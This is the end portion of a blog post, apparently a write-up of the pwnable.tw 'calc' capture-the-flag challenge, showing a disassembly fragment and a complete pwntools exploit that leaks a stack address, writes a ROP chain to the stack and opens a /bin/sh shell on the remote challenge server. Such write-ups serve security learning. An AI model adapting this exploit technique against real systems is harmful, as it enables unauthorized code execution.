+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:<span class="number">08049452</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">08049452</span>                 push    ebp</span><br><span class="line">.text:<span class="number">08049453</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">08049455</span>                 <span class="keyword">and</span>     esp, <span class="number">0F</span>FFFFFF0h</span><br><span class="line">.text:<span class="number">08049458</span>                 sub     esp, <span class="number">10</span>h</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="comment">#p = process('./calc.dms')</span></span><br><span class="line"></span><br><span class="line">keys=[<span class="number">0x0805c34b</span>,<span class="number">0xb</span>,<span class="number">0x080701d1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x08049a21</span>,u32(<span class="string">'/bin'</span>),u32(<span class="string">'/sh\0'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_binsh_addr</span><span class="params">()</span>:</span></span><br><span class="line">    p.recv(<span class="number">1024</span>)</span><br><span class="line">    p.sendline(<span class="string">'+'</span>+str(<span class="number">360</span>))</span><br><span class="line">    ebp_addr = int(p.recv())</span><br><span class="line">    rsp_addr =((ebp_addr+<span class="number">0x100000000</span>)&amp;<span class="number">0xFFFFFFF0</span>)<span class="number">-16</span></span><br><span class="line">    binsh_addr = rsp_addr+<span class="number">20</span><span class="number">-0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> binsh_addr</span><br><span class="line"></span><br><span class="line">keys[<span class="number">4</span>] = leak_binsh_addr()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_stack</span><span class="params">(addr,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'+'</span>+str(addr))</span><br><span class="line">    recv = int(p.recv())</span><br><span class="line">    <span class="keyword">if</span> content &lt; recv:</span><br><span class="line">        recv = recv - content</span><br><span class="line">        p.sendline(<span class="string">'+'</span>+str(addr)+<span class="string">'-'</span>+str(recv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recv = content-recv</span><br><span class="line">        p.sendline(<span class="string">'+'</span>+str(addr)+<span class="string">'+'</span>+str(recv))</span><br><span class="line"></span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    write_stack(<span class="number">361</span>+i,keys[i])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'bye\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/04/25/pwnable-tw-calc-writeup/" title="pwnable.tw calc writeup">https://v1ckydxp.github.io/archives/2019/04/25/pwnable-tw-calc-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-tw/" rel="tag"># pwnable.tw</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/24/pwnable-tw-orw-writeup/" rel="next" title="pwnable.tw orw writeup">
+                <i class="fa fa-chevron-left"></i> pwnable.tw orw writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/26/pwnable-tw-3x17-writeup/" rel="prev" title="pwnable.tw 3x17 writeup">
+                pwnable.tw 3x17 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看文件基本信息"><span class="nav-number">1.</span> <span class="nav-text">查看文件基本信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序行为"><span class="nav-number">1.1.</span> <span class="nav-text">分析程序行为</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA分析代码逻辑"><span class="nav-number">1.2.</span> <span class="nav-text">IDA分析代码逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程"><span class="nav-number">1.3.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
